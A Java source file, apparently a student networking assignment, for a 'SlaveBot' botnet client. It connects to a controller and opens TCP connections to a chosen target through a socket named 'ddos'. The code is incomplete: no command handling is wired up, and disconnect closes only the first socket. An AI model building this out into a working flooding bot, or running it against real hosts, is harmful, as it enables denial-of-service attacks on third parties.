package com.networkdesign.cmpe;
import java.net.*;
import java.util.*;
import java.io.*;

public class SlaveBot
{
	// variable declarations
	static ArrayList<Socket> remoteConnected = new ArrayList<>();
	Socket ddos;
	
	// Main Program
	public static void main(String[] args) 
	{
		int port = 0;
		String ip = null;
		
		// for connection
		if(args.length != 0)
		{
			// input example = "-h localhost -p 9999"
			if (args.length == 4) 
			{
				ip = args[1];
				port = Integer.parseInt(args[3]);
			}
			
			try
			{
				Socket client = new Socket(ip, port);
				System.out.println("Connected To Server " + client.getRemoteSocketAddress() + " " + client.getPort());

				
			} catch(IOException e)
			{
				e.printStackTrace();
			}
		}
		
	}

	// connect function
	public void connect(Socket selectedSlave, String targetIP, int targetPort) throws IOException
	{
		try
		{
			ddos = new Socket();
			ddos.connect(new InetSocketAddress(targetIP, targetPort));
			if(ddos.isConnected())
			{
				remoteConnected.add(ddos);
				System.out.println("Slave " + selectedSlave.getRemoteSocketAddress() + " is connected to " + ddos.getInetAddress() + " through port number " + ddos.getPort());

			}
			
		} catch(IOException e)
		{
			System.out.println("ERROR! (Connect)");
			e.printStackTrace();
		}
	}

	// disconnect function (can't seem to close specific slaves since local port keeps changing after it's added to the array. Can't udnestand why)
	public void disconnect(Socket selectedSlave, String targetIP, int targetPort) throws IOException
	{
		try
		{
			for(int i=0; i<remoteConnected.size(); i++)
			{
                                                System.out.println("The connection to "+remoteConnected.get(i).getRemoteSocketAddress()+" "+remoteConnected.get(i).getLocalPort()+" is closed.");
						remoteConnected.get(i).close();
						remoteConnected.remove(i);

						break;
				
			}
			
		} catch(IOException e)
		{
			System.out.println("ERROR! (Disconnect)");
			e.printStackTrace();
		}
	}


}
